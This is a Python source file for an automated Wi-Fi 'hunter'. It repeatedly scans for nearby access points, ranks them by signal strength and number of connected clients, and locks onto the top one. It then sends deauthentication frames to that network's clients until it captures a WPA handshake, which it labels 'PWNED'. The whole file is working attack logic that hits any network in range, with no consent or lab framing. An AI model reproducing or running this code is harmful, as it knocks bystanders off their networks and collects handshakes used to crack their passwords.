import threading
import time
import random

class HunterAutomation:
    def __init__(self, attack_manager):
        self.am = attack_manager
        self.running = False
        self.thread = None
        self.status = "IDLE"
        self.visited_bssids = set() # Avoid sticking to one target
        self.ignored_bssids = set() 

    def start(self):
        if self.running: return
        self.running = True
        self.status = "STARTING"
        self.thread = threading.Thread(target=self._loop)
        self.thread.daemon = True
        self.thread.start()
        print("[HUNTER] Auto-Pilot Started.")

    def stop(self):
        self.running = False
        self.status = "IDLE"
        try:
            self.am.stop_scan() # CRITICAL FIX: Release the card!
        except:
            pass
        print("[HUNTER] Auto-Pilot Stopping...")

    def _loop(self):
        while self.running:
            try:
                # 1. SCAN PHASE
                self.status = "SCANNING"
                # If not already hopping, start hopping
                if not self.am.hopping and not self.am.target_channel:
                     self.am.start_passive_scan()
                
                # Scan for X seconds to gather potential targets
                scan_duration = 10
                for i in range(scan_duration):
                    if not self.running: break
                    time.sleep(1)

                if not self.running: break

                # 2. EVALUATE PHASE
                self.status = "ANALYZING"
                results = self.am.get_results()
                aps = results["aps"]
                handshakes = results.get("handshakes", [])
                
                # Filter targets
                candidates = []
                for bssid, data in aps.items():
                    # Skip if already pwned (handshake captured)
                    if any(h['bssid'] == bssid for h in handshakes):
                        continue
                    
                    # Skip if visited recently (simple loop prevention)
                    # For a real persistent hunter, we might want to retry later, 
                    # but for now let's avoid getting stuck on one difficult AP.
                    if bssid in self.visited_bssids:
                        continue

                    # Score criteria:
                    # - Must have signal > -85 (usable)
                    # - Bonus for clients (traffic = handshake chance)
                    signal = data.get("signal", -100)
                    clients = len(data.get("clients", {}))
                    
                    if signal > -85:
                        score = signal + (clients * 20) # Significantly prefer active networks
                        candidates.append((score, bssid, data))
                
                # Sort by score triggers
                candidates.sort(key=lambda x: x[0], reverse=True)

                if candidates:
                    target = candidates[0]
                    target_bssid = target[1]
                    target_data = target[2]
                    target_channel = target_data["channel"]
                    
                    self.status = f"HUNTING: {target_data.get('ssid')} (CH {target_channel})"
                    print(f"[HUNTER] Locked on {target_data.get('ssid')} ({target_bssid})")

                    # 3. ATTACK PHASE (Listen)
                    # Lock channel
                    self.am.start_targeted_scan(target_channel)
                    
                    # Wait for handshake (Passive Listen + Active Deauth)
                    hunt_duration = 45
                    captured = False  # Track if handshake was captured

                    start_hunt = time.time()
                    last_deauth = 0

                    while time.time() - start_hunt < hunt_duration:
                       if not self.running: break
                       
                       # DEAUTH TRIGGER (Every 10 seconds)
                       if time.time() - last_deauth > 10:
                           # Target specific clients if known, otherwise broadcast (riskier/nosier)
                           known_clients = target_data.get("clients", {})
                           if known_clients:
                               for client_mac in list(known_clients.keys())[:3]: # Limit to top 3 clients
                                   self.am.send_deauth(target_bssid, client_mac, count=3)
                           else:
                               # No clients known, try broadcast deauth (might be ignored by some APs)
                               self.am.send_deauth(target_bssid, count=2)
                           
                           last_deauth = time.time()

                       # Check if we got it
                       current_results = self.am.get_results()
                       current_handshakes = current_results.get("handshakes", [])
                       if any(h['bssid'] == target_bssid for h in current_handshakes):
                           print(f"[HUNTER] PWNED! Handshake captured for {target_data.get('ssid')}")
                           captured = True
                           break
                       
                       time.sleep(1)
                    
                    # 4. POST-ATTACK
                    self.visited_bssids.add(target_bssid)
                    
                    if captured:
                        self.status = f"PWNED: {target_data.get('ssid')}"
                        time.sleep(3) # Celebrate briefly
                    else:
                        print(f"[HUNTER] Timestamp expired for {target_data.get('ssid')}. Moving on.")
                    
                    # Resume Scanning
                    self.am.start_passive_scan()

                else:
                    self.status = "NO TARGETS"
                    time.sleep(2)

            except Exception as e:
                print(f"[HUNTER] Error: {e}")
                time.sleep(5)
